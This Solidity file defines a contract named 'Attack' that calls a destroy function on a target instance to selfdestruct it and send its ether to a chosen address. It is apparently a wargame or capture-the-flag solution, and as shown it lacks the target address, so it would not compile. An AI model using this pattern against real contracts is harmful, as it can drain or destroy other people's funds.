// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Instance {

    function destroy(address payable) external;
}

contract Attack {

    Instance token = Instance();

    function attack(address payable to) public {

        token.destroy(to);
    }
}